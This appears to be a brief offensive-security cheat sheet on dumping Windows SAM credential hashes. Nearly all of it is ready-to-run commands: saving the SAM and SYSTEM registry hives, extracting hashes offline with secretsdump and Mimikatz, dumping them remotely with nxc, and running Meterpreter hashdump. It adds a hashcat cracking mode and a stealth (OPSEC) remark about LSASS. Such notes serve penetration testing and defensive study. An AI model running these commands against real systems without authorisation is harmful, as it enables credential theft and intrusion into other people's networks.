Security Account Manager is a database file that stores Windows user account credentials.

[DCC2 + LSA Secrets](DCC2%20+%20LSA%20Secrets.md)
Hash format: LM & NTLM/RC4 HMAC (hashcat: 1000)

Registries:
`HKLM\SAM`
`HKLM\SYSTEM`
### Registry Dumping
Saving SAM registry hives
```bash
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
```
(Secretsdump) Offline SAM dumping
```bash
secretsdump.py -sam sam.save -system system.save LOCAL
```
(Mimikatz) Offline SAM dumping
```bash
mimikatz.exe lsadump::sam /system:system.save /sam:sam.save
```
(NXC) Remote SAM dumping
```bash
nxc smb <TARGET> -u <USER> -p <PASS> --sam
```
(Meterpreter) Dumping credentials
```bash
hashdump
```
### In-Memory Techniques
- Not OPSEC friendly because LSASS process is used, which is traceable.

(Mimikatz) Dumping LSASS memory SAM database
[LSASS.exe](LSASS.exe.md)
